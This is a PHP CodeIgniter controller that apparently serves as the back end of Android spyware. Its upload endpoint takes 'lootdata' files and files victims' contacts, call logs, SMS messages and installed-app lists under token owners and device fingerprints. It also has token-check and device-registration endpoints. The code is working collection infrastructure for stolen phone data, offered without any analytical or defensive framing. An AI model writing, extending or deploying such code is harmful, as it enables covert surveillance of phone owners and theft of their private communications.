<?php

namespace App\Controllers\api;

use App\Controllers\BaseController;

use App\Models\Mod_Parse_Loot;
use App\Models\Mod_Receive;
use App\Models\Mod_Android;
use App\Models\Mod_Crypt;
use App\Models\Mod_User;
use CodeIgniter\API\ResponseTrait;

class Receive extends BaseController
{
    use ResponseTrait;

	public function upload(){
        $model_receive = new Mod_Receive();
        $model_parse_uploaded = new Mod_Parse_Loot();
        $dated = date('Y-m-d H:i:s');

		if (!empty($_FILES) ) {
            $uploaded_File = $this->request->getFile('lootdata');
            $random_name =  $uploaded_File->getRandomName();

            move_uploaded_file($_FILES["lootdata"]["tmp_name"], WRITEPATH .'uploads/text_dump/'.$random_name);

			$var_file_name = $random_name;
            $var_file_rname = $uploaded_File->getName();
            $var_file_size = $model_receive->get_file_size($uploaded_File->getSize());
            $var_file_ext = pathinfo("uploads/text_dump/" . $random_name, PATHINFO_EXTENSION);
            $var_file_category = explode("_", $var_file_rname);
            $var_file_token = $_POST['token'];
            $var_file_print = $_POST['print_id'];
            $var_file_owner = $model_receive->get_token_owner($var_file_token)['Token_Owner'];

			$model_receive->make_upload($var_file_token , $var_file_rname , $var_file_name , $var_file_size, $var_file_ext, $var_file_category[0]);

			$file_content = $var_file_category[0];//$model_parse_uploaded->get_file_category($var_file_rname);

			if ($file_content == "contacts") {
				$model_parse_uploaded->get_contacts($var_file_name, $var_file_owner,$var_file_print);
			}
			else if ($file_content == "logs") {
				$model_parse_uploaded->get_logs($var_file_name, $var_file_owner,$var_file_print);
			}
			else if ($file_content == "sms") {
				$model_parse_uploaded->get_sms($var_file_name, $var_file_owner,$var_file_print);
			}
			else if ($file_content == "apps") {
				$model_parse_uploaded->get_apps($var_file_name,$var_file_owner,$var_file_print);
			}

        } else {
			echo "No files uploaded";
		}
	}

	public function token_verify(){
        $model_receive = new Mod_Receive();
        $model_android = new Mod_Android();
        $model_user = new Mod_User();
        $model_cryption = new Mod_Crypt();

        $dated = date('Y-m-d H:i:s');

		if (isset($_POST['token']) && isset($_POST['time'])) {
			$var_sent_token = $_POST['token'];
			$var_time = $_POST['time'];
            $model_receive->make_test_token($var_sent_token , $var_time , $this->request->getIPAddress(), "format_correct");
			$is_valid = $model_android->token_test($var_sent_token);

			if ($is_valid != NULL && $is_valid != "--nill--" ) {

				$user_data = $model_user->get_vars($is_valid['Token_Owner']);
				$user_name = $model_cryption->Dec_String(base64_decode($user_data['Name']));
				$user_email = $model_cryption->Dec_String(base64_decode($user_data['Email']));

				$model_user->token_mark($is_valid['Token_Owner'], $var_sent_token, $is_valid['Token_ID']);

                return $this->respond([
                    'token' => $var_sent_token,
                    'validity' => "True",
                    'time' => $dated,
                    'token_owner' => $is_valid['Token_Owner'],
                    'token_expiry' => $is_valid['Token_Expiry'],
                    'token_id' => $is_valid['Token_ID'],
                    'token_owner_name' => $user_name
                ]);

			}else if( $is_valid == "--nill--" ){
                return $this->respond([
                    'token' => "--nill--",
                    'validity' => "False",
                    'time' => $dated
                ]);
			}
        } else {
            return $this->respond([
                'token' => "isFake",
                'validity' => "False",
                'time' => $dated
            ]);
			$model_receive->make_test_token("-Uknown-" , "-Unknown-" , $this->request->getIPAddress(), "format_incorrect");;
		}
	}

    public function device_print(){
        $model_receive = new Mod_Receive();
        $dated = date('Y-m-d H:i:s');
        if (isset($_POST)){
            $pd_id = $model_receive->make_device_print($_POST);
            echo $pd_id;//"{'pd_id': '$pd_id'}";
        }else{
            //echo "{'Status': 'Failed'}";
            return $this->respond([
                'Status' => "Failed",
                'time' => $dated,
            ]);
        }
    }

}
